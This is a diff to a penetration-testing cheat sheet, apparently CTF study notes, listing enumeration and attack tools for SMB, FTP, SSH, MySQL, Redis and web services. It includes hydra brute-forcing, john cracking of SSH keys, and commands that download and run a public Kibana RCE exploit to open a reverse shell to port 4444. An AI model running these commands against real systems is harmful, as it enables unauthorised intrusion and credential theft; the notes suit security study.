@@ -60,6 +60,7 @@ OUPUT
 | 989, 990 |   FTPS |   FTP over SSL/TLS (implicit mode)             |  TCP                |
 | 3306     |  MySql |   mysql                                        |  TCP                |
 | 3389     |   RDP  |   Remote Desktop Protocol                      |  TCP and UDP        |
+| 6379     | Redis  |   Redis                                        |  TCP                |
 |          |        |                                                |                     |
 
 | Protocol |	Default Port |	Secured Protocol |	Default Port with TLS |
@@ -70,16 +71,22 @@ OUPUT
 | POP3 	   |     110 	     |       POP3S 	     |           995          |
 | IMAP 	   |     143 	     |       IMAPS 	     |           993          |
 
-## SMB
+# SMB
 - [Enum4Linux]
 - [smbclient]
-## FTP
+- [nmap] <nmap --script smb-enum-shares.nse -p445 target.ip>
+- [VULNERABILITIES]
+    - CVE:CVE-2017-0143, Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+
+# FTP
 - [ftp]: ftp user/anonymous to remote server 
-- [hydra]: bruteforce the password of the FTP Server. 
-## Telnet
+- [hydra]: bruteforce the password of the FTP Server
+
+# Telnet
 - [telnet]
 - [netcat]
-## HTTP / Web-Application
+
+# HTTP / Web-Application
 - [Browser]
     - Source
     - Network
@@ -105,7 +112,7 @@ OUPUT
         - hash <https://crackstation.net/>
         - Unpredictable
     - FI: File inclusion
-        - Local File Inclusion
+        - Local File Inclusion: Attacker can include a malicious file only from the same server
         - Remote File Inclusion
     - PT: Path Traversal
     - SSRF: Server-Side Request Forgery
@@ -120,6 +127,7 @@ OUPUT
     - SQLi: SQL Injection
         - In-Band SQL Injection
         - Blind SQLi
+- [whatweb]
 - [nikto]: Vulnerability scanning
 - [searchsploit]: Finding and web application vulnerabilities
 - [hydra]: Brute Force Login
@@ -132,17 +140,21 @@ OUPUT
 - [python]
     - [2to3]: Convert pythonRecon2 to python3
     - Run python expolit file again
-## NFS
+
+# NFS
 - [mount]: Mounting NFS shares <sudo mount -t nfs IP:share /tmp/mount/ -nolock>
-## SMTP
+
+# SMTP
 - [msfconsole]
-## RPC
+
+# RPC
 - [nmap] <nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount target.ip>
 - [rpcinfo] <rpcinfo target.ip>
 - [showmount] <showmount -e target.ip>
 - [mount] <sudo mount -t nfs target.ip:/share /mnt/nfs>
 - [umount] <sudo umount -f -l /mnt/nfs>
-## SSH
+
+# SSH
 - [ssh]:
     - <ssh user@target.ip -p 22>
     - <ssh -i id_rsa user@target.ip -p 1337>
@@ -153,15 +165,30 @@ OUPUT
 - [john]
     - ssh2john id_rsa > id_rsa.hash
     - john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash
-## MySql
+
+# MySql
 - [mysql]
     - connet with root:root <mysql -u root -h target.ip -p>
 - [msfconsole]
 - [hydra]
     - Brute Force Login
-## POP3
+
+# Redis
+- [namp] <nmap --script redis-info -sV -p 6379 target.ip>
+- [nc] 
+    - <nc -vn 10.10.10.10 6379>
+    - INFO
+- [redis-cli]
+    - <redis-cli -h target.ip>
+    - INFO
+    - set password for redis 
+        - <config set requirepass p@ss$12E45>
+        - SAVE
+
+# POP3
 - [telnet] <telnet target.ip 110>
-## IMAP
+
+# IMAP
 
 
 # Find Any Access Point
@@ -170,12 +197,17 @@ Vulnerability Scanning Tools and Public Repositories
 - [Nexpose]
 - [OpenVAS]
 - [searchsploit]
-- [ExploitDB] <https://www.exploit-db.com>
+- [ExploitDB] https://www.exploit-db.com
 - [NVD] <https://nvd.nist.gov/vuln/search>
 - [Mitre] <https://www.cve.org>
 - [OVAL] <https://oval.cisecurity.org/repository>
 - [rapid7] <https://www.rapid7.com/db/>
 - [favicon] <https://wiki.owasp.org/index.php/OWASP_favicon_database>
+- [vulnerability]
+    - [CVE-2019-7609] https://github.com/LandGrey/CVE-2019-7609
+    - wget https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/master/CVE-2019-7609-kibana-rce.py
+    - python2 CVE-2019-7609-kibana-rce.py -h
+    - python2 CVE-2019-7609-kibana-rce.py -u http://target.ip:5601 -host 10.8.56.2 -port 4444 --shell
 Firefox network.security.ports.banned.override
 - [ERR]: network.security.ports.banned.override > string : 22
 Stegan files
